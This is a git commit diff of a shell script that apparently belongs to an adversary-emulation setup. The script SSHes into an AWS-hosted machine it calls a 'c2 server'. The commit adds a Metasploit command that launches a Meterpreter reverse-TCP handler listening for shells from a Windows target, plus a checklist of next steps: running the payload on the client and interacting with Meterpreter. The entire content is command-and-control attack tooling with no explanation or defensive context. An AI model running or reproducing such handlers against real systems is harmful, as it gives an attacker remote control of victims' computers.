d5fe9ed81cd0998992f6ef7b9d6f3693a811bb4e
jhjhajh <49915836+jhjhajh@users.noreply.github.com>
2022-09-02 16:11:31 +0800

    Update testscript.sh

--- testscript.sh
+++ testscript.sh
@@ -4,9 +4,19 @@ echo "connecting to c2 server..."
 
 ssh -i "carbanaktest2.pem" kali@ec2-35-171-225-42.compute-1.amazonaws.com 'bash -s' << 'ENDSSH'
   echo "connected to c2 server"
-  
+  sudo msfconsole -q -x "use exploit/multi/handler;set payload windows/x64/meterpreter/reverse_tcp;set lport 8080;set lhost 192.168.0.4;set ExitOnSession False;exploit -j"
+
+
+# $echo <password> | sudo -S <command>
 # tmux
-# start metasploit listener
+# start metasploit - done
+# input listener details - done
+# start handler (exploit)
 # switch tab
-# listen on the tab
+# ssh into windows client
+# run payload
+# switch tab
+# interact with meterpreter
+# exit
+# quit metasploit
 ENDSSH
